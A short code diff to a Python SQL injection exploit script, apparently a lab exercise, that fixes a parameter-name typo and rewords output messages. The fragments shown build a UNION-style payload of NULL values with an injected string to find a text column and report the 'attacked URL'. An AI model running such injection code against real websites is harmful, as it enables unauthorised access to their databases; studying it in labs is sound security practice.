@@ -29,7 +29,7 @@ def exploit_sqli_find_string_column(num_col, path):
             return i+1
     return False
 
-def exploit_sqli_string_field(url,path,num_coñ, num_col_string, string_to_find):
+def exploit_sqli_string_field(url,path,num_col, num_col_string, string_to_find):
     
     array_null_string = ["NULL"] * num_col
     array_null_string[num_col_string-1] = "'" + string_to_find + "'"
@@ -59,7 +59,6 @@ if __name__ == "__main__":
     if num_col:
         print("[+] The number of columns is " + str(num_col) + ".")
         print("[+] The number of column that contains an string is " + str(num_col_string) + ".")
-        print("[+] The URL must be attacked is: " +  url_attack)
+        print("[+] The attacked URL is: " +  url_attack)
     else:
         print("[-] The SQLi attack was not successful.")
-    
